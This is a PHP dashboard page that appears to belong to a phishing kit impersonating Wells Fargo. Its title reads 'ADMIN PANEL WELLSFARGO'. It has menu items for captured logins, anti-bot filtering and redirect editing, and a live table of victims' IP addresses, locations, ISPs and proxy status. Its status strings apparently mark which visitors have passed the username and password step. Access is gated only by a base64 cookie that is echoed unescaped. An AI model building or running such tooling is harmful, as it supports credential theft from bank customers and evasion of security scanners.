
<?php
$value = '';
if (isset($_COOKIE['auth'])) {  
  $values =  $_COOKIE["auth"];
  $value = base64_decode($values);
}
else{
  header("Location: ../");
  die();
}

?>


<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="apple-touch-icon" sizes="76x76" href="../assets/img/apple-icon.png">
  <link rel="icon" type="image/png" href="../assets/img/favicon.png">
  <title>
  ADMIN PANEL WELLSFARGO

  </title>
  <!--     Fonts and icons     -->
  <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900|Roboto+Slab:400,700" />
  <!-- Nucleo Icons -->
  <link href="../assets/css/nucleo-icons.css" rel="stylesheet" />
  <link href="../assets/css/nucleo-svg.css" rel="stylesheet" />
  <!-- Font Awesome Icons -->
  <script src="https://kit.fontawesome.com/42d5adcbca.js" crossorigin="anonymous"></script>
  <!-- Material Icons -->
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Round" rel="stylesheet">
  <!-- CSS Files -->
  <link id="pagestyle" href="../assets/css/material-dashboard.css?v=3.1.0" rel="stylesheet" />
  <!-- Nepcha Analytics (nepcha.com) -->
  <!-- Nepcha is a easy-to-use web analytics. No cookies and fully compliant with GDPR, CCPA and PECR. -->
  <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
  <link id="pagestyle" href="../assets/css/style.css" rel="stylesheet" />

</head>

<body class="g-sidenav-show  bg-gray-200">
  <aside class="sidenav navbar navbar-vertical navbar-expand-xs border-0 border-radius-xl my-3 fixed-start ms-3   bg-gradient-dark" id="sidenav-main">
    <div class="sidenav-header">
      <i class="fas fa-times p-3 cursor-pointer text-white opacity-5 position-absolute end-0 top-0 d-none d-xl-none" aria-hidden="true" id="iconSidenav"></i>
      <a class="navbar-brand m-0" href=" https://demos.creative-tim.com/material-dashboard/pages/dashboard " target="_blank">
        <span class="ms-1 font-weight-bold text-white">WAR GAMES PANEL</span>
      </a>
    </div>
    <hr class="horizontal light mt-0 mb-2">
    <div class="collapse navbar-collapse  w-auto " id="sidenav-collapse-main">
      <ul class="navbar-nav">
        <li class="nav-item">
          <a class="nav-link text-white" href="../pages/dashboard.php">
            <div class="text-white text-center me-2 d-flex align-items-center justify-content-center">
              <i class="material-icons opacity-10">dashboard</i>
            </div>
            <span class="nav-link-text ms-1">Dashboard</span>
          </a>
        </li>
        <li class="nav-item">
          <a class="nav-link text-white " href="../pages/login_visit.php">
            <div class="text-white text-center me-2 d-flex align-items-center justify-content-center">
              <i class="material-icons opacity-10">table_view</i>
            </div>
            <span class="nav-link-text ms-1">LOGIN</span>
          </a>
        </li>
        <li class="nav-item">
          <a class="nav-link text-white active bg-gradient-dark" href="../pages/acces_webiste.php">
            <div class="text-white text-center me-2 d-flex align-items-center justify-content-center">
              <i class="material-icons opacity-10">table_view</i>
            </div>
            <span class="nav-link-text ms-1">VISITOR</span>
          </a>
        </li>
        <li class="nav-item">
          <a class="nav-link text-white " href="../pages/anti-bot.php">
            <div class="text-white text-center me-2 d-flex align-items-center justify-content-center">
              <i class="material-icons opacity-10">table_view</i>
            </div>
            <span class="nav-link-text ms-1">ANTIBOT</span>
          </a>
        </li>
        <li class="nav-item">
          <a class="nav-link text-white " href="../pages/update_url.php">
            <div class="text-white text-center me-2 d-flex align-items-center justify-content-center">
              <i class="material-icons opacity-10">table_view</i>
            </div>
            <span class="nav-link-text ms-1">EDIT REDIRECT</span>
          </a>
        </li>
        <li class="nav-item mt-3">
          <h6 class="ps-4 ms-2 text-uppercase text-xs text-white font-weight-bolder opacity-8">Account pages</h6>
        </li>
        <li class="nav-item">
          <a class="nav-link text-white " href="../">
            <div class="text-white text-center me-2 d-flex align-items-center justify-content-center">
              <i class="material-icons opacity-10">login</i>
            </div>
            <span class="nav-link-text ms-1">LOG OUT</span>
          </a>
        </li>
      </ul>
    </div>
  </aside>
  <main class="main-content position-relative max-height-vh-100 h-100 border-radius-lg ">
    <!-- Navbar -->
    <nav class="navbar navbar-main navbar-expand-lg px-0 mx-4 shadow-none border-radius-xl" id="navbarBlur" data-scroll="true">
      <div class="container-fluid py-1 px-3">
        <nav aria-label="breadcrumb">
          <ol class="breadcrumb bg-transparent mb-0 pb-0 pt-1 px-0 me-sm-6 me-5">
            <li class="breadcrumb-item text-sm"><a class="opacity-5 text-dark" href="javascript:;">APP</a></li>
            <li class="breadcrumb-item text-sm text-dark active" aria-current="page">VISITOR</li>
          </ol>
          <h6 class="font-weight-bolder mb-0">VISITOR</h6>
        </nav>
        <div class="collapse navbar-collapse mt-sm-0 mt-2 me-md-0 me-sm-4" id="navbar">
          <div class="ms-md-auto pe-md-3 d-flex align-items-center">
            
          </div>
          <ul class="navbar-nav  justify-content-end">
            <li class="nav-item d-flex align-items-center">
              <a  class="nav-link text-body font-weight-bold px-0">
                <i class="fa fa-user me-sm-1"></i>
                <span class="d-sm-inline d-none"><?php echo $value;?></span>
              </a>
            </li>
          </ul>
        </div>
      </div>
    </nav>
    <!-- End Navbar -->
    <div class="container-fluid py-4">
      <div class="row">
        <div class="col-12">
          <div class="card my-4">
            <div class="card-header p-0 position-relative mt-n4 mx-3 z-index-2">
              <div class="bg-gradient-dark shadow-dark border-radius-lg pt-4 pb-3">
                <h6 class="text-white text-capitalize ps-3" id="visitor_total">VISITOR</h6>
              </div>
            </div>
            <div class="card-body px-0 pb-2" style="
                    height: 500px;
                    scroll-behavior: auto;
                    overflow: scroll;
                ">
              <div class="table-responsive p-0">
                <table class="table align-items-center mb-0">
                  <thead>
                  <tr>
                      <th class="text-uppercase text-secondary text-xxs font-weight-bolder opacity-7">#ID</th>
                      <th class="text-uppercase text-secondary text-xxs font-weight-bolder opacity-7">IP</th>
                      <th class="text-center text-uppercase text-secondary text-xxs font-weight-bolder opacity-7">DATA</th>
                      <th class="text-center text-uppercase text-secondary text-xxs font-weight-bolder opacity-7">COUNTRY</th>
                      <th class="text-center text-uppercase text-secondary text-xxs font-weight-bolder opacity-7">CITY</th>
                      <th class="text-center text-uppercase text-secondary text-xxs font-weight-bolder opacity-7">ISP</th>
                      <th class="text-center text-uppercase text-secondary text-xxs font-weight-bolder opacity-7">PROXY</th>
                      <th class="text-center text-uppercase text-secondary text-xxs font-weight-bolder opacity-7">HOSTINGER</th>
                      <th class="text-center text-uppercase text-secondary text-xxs font-weight-bolder opacity-7">ORG</th>
                    </tr>
                  </thead>
                  <tbody id="tbodix">
                  
                  </tbody>
                </table>
                <div class="loading" style="display: none;">
                  <div class="lds-ripple"><div></div><div></div></div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </main>
  <!--   Core JS Files   -->
  <script src="../assets/js/core/popper.min.js"></script>
  <script src="../assets/js/core/bootstrap.min.js"></script>
  <script src="../assets/js/plugins/perfect-scrollbar.min.js"></script>
  <script src="../assets/js/plugins/smooth-scrollbar.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>

  <script>
    var win = navigator.platform.indexOf('Win') > -1;
    if (win && document.querySelector('#sidenav-scrollbar')) {
      var options = {
        damping: '0.5'
      }
      Scrollbar.init(document.querySelector('#sidenav-scrollbar'), options);
    }
  </script>
  <script src="../assets/js/material-dashboard.min.js?v=3.1.0"></script>
</body>






<script>





  $('.loading').show()
  let old_data = []; // Array pentru a stoca datele anterioare
  function fetchData() {
   $.ajax({
     url : '../php-api/check_ips.php',
     type : 'GET',
     dataType: 'json',
     success : function (result) {
      $('#visitor_total').text( `${result.length} TOTAL` )
        result.reverse();
        $('.loading').hide()
        if (!compare_data(old_data, result)) { 
            $('#tbodix').empty();
            result.forEach((row, index) => {
              if(row.status == 'SUCCES CHALLENGE ACCES WEBSITE'){
                var succes_capcha = `<a href="javascript:;" class="avatar avatar-m rounded-circle" data-bs-toggle="tooltip" data-bs-placement="bottom" title="${row.status}">
                          <img src="../assets/img/secured_9473261.png" alt="team1">
                        </a>`
              }else if(row.status == 'SUCCES CHALLENGE STEP USER_PASS'){
                var succes_capcha = `<a href="javascript:;" class="avatar avatar-m rounded-circle" data-bs-toggle="tooltip" data-bs-placement="bottom" title="${row.status}">
                          <img src="../assets/img/Encryption.png" alt="team1">
                        </a>`
              }else{
                var succes_capcha = `<a href="javascript:;" class="avatar avatar-m rounded-circle" data-bs-toggle="tooltip" data-bs-placement="bottom" title="${row.status}">
                          <img src="../assets/img/2889543.png" alt="team1">
                        </a>`
              }
            if(row.proxy_detected == 'PROXY NO DETECTED'){
              var proxys = `<i class='bx bxs-check-shield' style="font-size: 40px; color:green"></i>`
             }else{
              var proxys = `<i class='bx bxs-shield-x' style="font-size: 40px; color:red"></i>`
             }
    
             if(row.hostinger_detected == 'HOSTINGER NO DETECTED'){
              var hostinger_detected = `<i class='bx bxs-check-shield' style="font-size: 40px; color:green"></i>`
             }else{
              var hostinger_detected = `<i class='bx bxs-shield-x' style="font-size: 40px; color:red"></i>`
             }
            var newRow = 
            `<tr>
                <td class="align-middle text-center text-sm">
                              <span class="text-xs font-weight-bold">${index+1}</span>
                            </td>
                              <td>
                                <div class="d-flex px-2 py-1">
                                  <div>
                                    <img src="../assets/img/kisspng-user-profile-computer-icons-clip-art-profile-5ac092f7234443.6656665915225699751445.png" class="avatar avatar-sm me-3 border-radius-lg" alt="user1">
                                  </div>
                                  <div class="d-flex flex-column justify-content-center">
                                    <h6 class="mb-0 text-sm">${row.ip}</h6>
                                    <p class="text-xs text-secondary mb-0"> ${row.name}</p>
                                  </div>
                                </div>
                              </td>
                              <td class="align-middle text-center text-sm">
                              <span class="text-xs font-weight-bold">${row.timestamp}</span>
                                </td>
                                <td class="align-middle text-center text-sm">
                              <span class="text-xs font-weight-bold">${row.country} </span>
                            </td>
                            <td class="align-middle text-center text-sm">
                              <span class="text-xs font-weight-bold">${row.city}</span>
                            </td>
                            <td class="align-middle text-center text-sm">
                              <span class="text-xs font-weight-bold">${row.company}</span>
                            </td>
                            <td class="align-middle text-center text-sm">
                              <span class="text-xs font-weight-bold">
                                  ${proxys}
                              </span>
                            </td>
                            <td class="align-middle text-center text-sm">
                      <span class="text-xs font-weight-bold">
                            ${hostinger_detected}
                    </span>
                            <td class="align-middle text-center text-sm">
                            <span class="text-xs font-weight-bold">${row.as_number}</span>
                            </td>
                            </tr>
                    <tr>`;
    
            $('#tbodix').append(newRow);
          }); 
          old_data = result;
        }
     },
     error : function () {
        console.log ('errordwdwd');
     }

     
   });

  }
  function compare_data(old_data, new_Data) {
  return JSON.stringify(old_data) === JSON.stringify(new_Data);
}
fetchData()
setInterval(fetchData, 3000);
</script>



</html>